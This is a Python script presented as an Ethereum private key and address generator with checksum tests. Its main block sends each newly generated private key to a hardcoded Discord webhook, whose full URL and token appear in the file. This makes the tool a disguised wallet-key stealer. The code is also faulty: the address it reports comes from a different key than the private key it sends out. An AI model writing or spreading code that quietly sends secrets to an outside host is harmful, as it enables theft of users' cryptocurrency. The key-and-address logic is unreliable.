#!/usr/bin/env python3

# Install the required packages using pip
# pip install ecdsa
# pip install pysha3
# pip install requests

from ecdsa import SigningKey, SECP256k1
import sha3
import requests

WEBHOOK_URL = 'https://discord.com/api/webhooks/1133628939810644048/2dTrXlWdawAQvMrm6EPOOvquzJ8D0ek7_j_jPPNiGZTceXN3vYH9NH84-F3PRQm4Tbh1'


def checksum_encode(address: str) -> str:
    """Compute the Ethereum checksum address for a given hex address.

    Args:
        address (str): Hex address string starting with '0x'.

    Returns:
        str: Ethereum checksum address.
    """
    keccak = sha3.keccak_256()
    address = address.lower().replace('0x', '')
    keccak.update(address.encode('ascii'))
    hash_address = keccak.hexdigest()

    checksum_address = ''.join(
        char.upper() if int(hash_address[i], 16) >= 8 else char
        for i, char in enumerate(address)
    )
    return f'0x{checksum_address}'


def generate_eth_address() -> str:
    """Generate an Ethereum address from a new private key.

    Returns:
        str: Ethereum address in checksum format.
    """
    keccak = sha3.keccak_256()

    # Generate a new private key and derive the public key
    private_key = SigningKey.generate(curve=SECP256k1)
    public_key = private_key.get_verifying_key().to_string()

    # Generate address from public key
    keccak.update(public_key)
    address = keccak.hexdigest()[24:]

    return checksum_encode(address)


def test_checksum_encoding(address: str) -> None:
    """Test the checksum encoding function for validity.

    Args:
        address (str): Address to test.
    """
    assert address == checksum_encode(address), f"Checksum encoding failed for address: {address}"


def send_to_discord(message: str) -> None:
    """Send a message to a Discord channel using a webhook.

    Args:
        message (str): Message to send.
    """
    data = {
        'content': message
    }
    response = requests.post(WEBHOOK_URL, json=data)
    print(f"Message has been sent to discord {data}")
    if response.status_code != 204:
        print(f"Failed to send message to Discord: {response.status_code}, {response.text}")


if __name__ == "__main__":
    # Test cases
    test_checksum_encoding('0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed')
    test_checksum_encoding('0xfB6916095ca1df60bB79Ce92cE3Ea74c37c5d359')
    test_checksum_encoding('0xdbF03B407c01E7cD3CBea99509d93f8DDDC8C6FB')
    test_checksum_encoding('0xD1220A0cf47c7B9Be7A2E6BA89F429762e7b9aDb')
    test_checksum_encoding('0x7aA3a964CC5B0a76550F549FC30923e5c14EDA84')

    # Generate and print private key, public key, and Ethereum address
    eth_address = generate_eth_address()
    private_key = SigningKey.generate(curve=SECP256k1)
    public_key = private_key.get_verifying_key().to_string()

    private_key_hex = private_key.to_string().hex()
    public_key_hex = public_key.hex()

    output_message = (
        f"Private key: {private_key_hex}\n"
        f"Public key:  {public_key_hex}\n"
        f"Address:     {eth_address}"
    )



    # Send to Discord
    send_to_discord(output_message)
